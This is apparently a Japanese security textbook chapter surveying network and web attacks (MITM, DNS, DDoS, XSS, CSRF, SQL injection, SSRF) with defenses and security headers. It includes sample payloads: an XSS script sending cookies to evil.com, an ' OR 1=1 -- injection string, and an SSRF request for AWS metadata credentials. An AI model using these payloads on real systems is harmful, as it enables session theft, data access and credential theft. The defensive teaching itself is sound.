# ネットワーク攻撃と対策

> ネットワーク上の主要な攻撃手法と防御策を理解する。MITM、DNS汚染、DDoS、セッションハイジャック、SQLインジェクション等を学び、安全なシステム設計の基盤を固める。

## この章で学ぶこと

- [ ] 主要なネットワーク攻撃の仕組みを理解する
- [ ] 各攻撃に対する防御策を把握する
- [ ] セキュリティ設計の原則を学ぶ

---

## 1. 中間者攻撃（MITM）

```
MITM（Man-in-the-Middle）:
  → 通信の間に入り込み、盗聴・改ざんする

  正常:  クライアント ←──────→ サーバー
  MITM:  クライアント ←→ 攻撃者 ←→ サーバー

  攻撃手法:
  ① ARPスプーフィング:
     → LANで偽のARP応答を送り、通信を自分に向ける

  ② Wi-Fiスニッフィング:
     → 暗号化されていないWi-Fiで通信を傍受

  ③ SSLストリッピング:
     → HTTPS接続をHTTPにダウングレード

  防御策:
  ✓ HTTPS（TLS）の必須化
  ✓ HSTS（HTTP Strict Transport Security）
     Strict-Transport-Security: max-age=31536000; includeSubDomains
  ✓ 証明書ピンニング（モバイルアプリ）
  ✓ 公共Wi-FiではVPN使用
```

---

## 2. DNS攻撃

```
① DNSキャッシュポイズニング:
  → リゾルバのキャッシュに偽のレコードを注入
  → ユーザーを偽サイトに誘導

  正常: example.com → 93.184.216.34（正しいIP）
  攻撃: example.com → 192.0.2.100（攻撃者のIP）

  防御: DNSSEC（DNS Security Extensions）
  → DNSレコードに電子署名を付与
  → 改ざんを検知可能

② DNSハイジャック:
  → ドメインの権威DNSサーバーの設定を変更
  → レジストラのアカウント侵害等

  防御:
  ✓ レジストラの2FA有効化
  ✓ ドメインロック
  ✓ レジストリロック（高価値ドメイン）

③ DNS増幅攻撃（DDoSの一種）:
  → 送信元IPを偽装してDNSに問い合わせ
  → 小さなリクエストで大きなレスポンスを被害者に集中

  リクエスト: 64バイト → レスポンス: 3,000バイト
  → 約50倍の増幅
```

---

## 3. DDoS攻撃

```
DDoS（Distributed Denial of Service）:
  → 大量のトラフィックでサービスを停止させる

  攻撃の分類:
  ┌──────────┬──────────────────────────────────┐
  │ 層       │ 攻撃手法                          │
  ├──────────┼──────────────────────────────────┤
  │ L3/L4    │ SYNフラッド: 大量のSYNパケット    │
  │（ネット）│ UDPフラッド: 大量のUDPパケット    │
  │          │ 増幅攻撃: DNS/NTP/memcached       │
  ├──────────┼──────────────────────────────────┤
  │ L7       │ HTTPフラッド: 大量のHTTPリクエスト│
  │（アプリ）│ Slowloris: 接続を長時間占有      │
  │          │ API乱用: 高コストなAPI呼び出し    │
  └──────────┴──────────────────────────────────┘

  防御:
  ① CDN / WAF:
     → CloudFlare, AWS Shield, Akamai
     → トラフィックをエッジで吸収

  ② レート制限:
     → IPあたりのリクエスト数制限
     → 429 Too Many Requests

  ③ Auto Scaling:
     → トラフィック増加時にサーバー追加
     → ただし攻撃の規模によっては追いつかない

  ④ Anycast:
     → 同じIPを複数のサーバーで受信
     → トラフィックを自動分散
```

---

## 4. Webアプリケーション攻撃

```
① XSS（Cross-Site Scripting）:
  → 悪意のあるスクリプトをWebページに注入

  タイプ:
  Stored XSS: DBに保存される（コメント欄等）
  Reflected XSS: URLパラメータ経由
  DOM-based XSS: クライアント側のJS処理

  攻撃例:
  <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

  防御:
  ✓ 出力エスケープ（HTML, JS, URL, CSS）
  ✓ Content-Security-Policy ヘッダー
  ✓ HttpOnly Cookie（JSからアクセス不可）
  ✓ フレームワークの自動エスケープ機能を活用

② CSRF（Cross-Site Request Forgery）:
  → ユーザーの認証状態を悪用して意図しない操作を実行

  攻撃: 悪意あるサイトからの自動POSTリクエスト
  → ユーザーのCookieが自動送信される

  防御:
  ✓ CSRFトークン（フォームに埋め込み、サーバーで検証）
  ✓ SameSite Cookie（Lax または Strict）
  ✓ Origin / Referer ヘッダーの検証

③ SQLインジェクション:
  → SQL文に悪意のある入力を注入

  攻撃例:
  入力: ' OR 1=1 --
  SQL: SELECT * FROM users WHERE name = '' OR 1=1 --'

  防御:
  ✓ パラメータ化クエリ（Prepared Statement）
  ✓ ORM の使用
  ✓ 入力のバリデーション
  ✗ 文字列連結でSQLを構築しない

④ SSRF（Server-Side Request Forgery）:
  → サーバーに内部リソースへのリクエストを実行させる

  攻撃例:
  GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
  → AWSメタデータからIAMクレデンシャルを窃取

  防御:
  ✓ URLのホワイトリスト検証
  ✓ 内部IPアドレスへのリクエストをブロック
  ✓ IMDSv2 の使用（AWS）
```

---

## 5. セキュリティヘッダー

```
推奨するHTTPセキュリティヘッダー:

  # XSS対策
  Content-Security-Policy: default-src 'self'; script-src 'self'

  # クリックジャッキング対策
  X-Frame-Options: DENY

  # MIMEタイプスニッフィング対策
  X-Content-Type-Options: nosniff

  # HTTPS強制
  Strict-Transport-Security: max-age=31536000; includeSubDomains

  # Referrer情報の制限
  Referrer-Policy: strict-origin-when-cross-origin

  # 機能制限
  Permissions-Policy: camera=(), microphone=(), geolocation=()

確認ツール:
  → https://securityheaders.com/
  → https://observatory.mozilla.org/
```

---

## 6. セキュリティ設計の原則

```
① 多層防御（Defense in Depth）:
  → 1つの防御が破られても次の層で防ぐ
  → WAF → ファイアウォール → アプリ → DB

② 最小権限の原則（Least Privilege）:
  → 必要最小限の権限のみ付与
  → IAMポリシー、DBユーザー権限

③ ゼロトラスト（Zero Trust）:
  → 「内部ネットワークだから安全」を前提としない
  → 常に認証・認可を要求
  → "Never trust, always verify"

④ フェイルセキュア:
  → エラー時は安全な状態にフォールバック
  → 認証エラー → アクセス拒否（許可ではない）

⑤ 入力の検証:
  → 全ての外部入力を信頼しない
  → バリデーション + サニタイズ
```

---

## まとめ

| 攻撃 | 防御 |
|------|------|
| MITM | HTTPS + HSTS |
| DNS汚染 | DNSSEC |
| DDoS | CDN/WAF + レート制限 |
| XSS | CSP + エスケープ + HttpOnly |
| CSRF | CSRFトークン + SameSite Cookie |
| SQLi | Prepared Statement |
| SSRF | URLホワイトリスト |

---

## 次に読むべきガイド
→ [[../04-advanced/00-load-balancing.md]] — ロードバランシング

---

## 参考文献
1. OWASP. "OWASP Top 10." 2021.
2. NIST. "SP 800-53: Security and Privacy Controls." 2020.
